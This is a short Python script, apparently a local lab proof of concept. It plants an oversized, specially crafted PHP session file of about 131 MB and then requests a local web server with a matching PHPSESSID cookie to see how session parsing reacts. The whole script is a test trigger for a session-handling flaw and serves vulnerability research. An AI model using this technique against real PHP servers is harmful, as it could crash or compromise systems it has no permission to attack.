#!/usr/bin/env python3
import os, sys, time, http.client
LAB='/tmp/opencode/research/wprealhex_20261022T011837Z'
SID=sys.argv[1] if len(sys.argv)>1 else 'hexp131'
N=int(sys.argv[2]) if len(sys.argv)>2 else 131000000
p=os.path.join(LAB,'sessions','sess_'+SID)
keylen=N-31
with open(p,'wb') as f:
    f.write(b'A'*keylen); f.write(b'|i:1;'); f.write(b'B'*26)
assert os.path.getsize(p)==N
print('plantfile',p,os.path.getsize(p),'keylen',keylen,flush=True)
c=http.client.HTTPConnection('127.0.0.1',28891,timeout=300)
t0=time.time()
c.request('GET','/',headers={'Cookie':'PHPSESSID='+SID})
r=c.getresponse(); d=r.read(); c.close()
print('status',r.status,'elapsed %.2f'%(time.time()-t0),'resp',d[:120],flush=True)
time.sleep(0.3)
print('file_after', os.path.exists(p) and os.path.getsize(p))
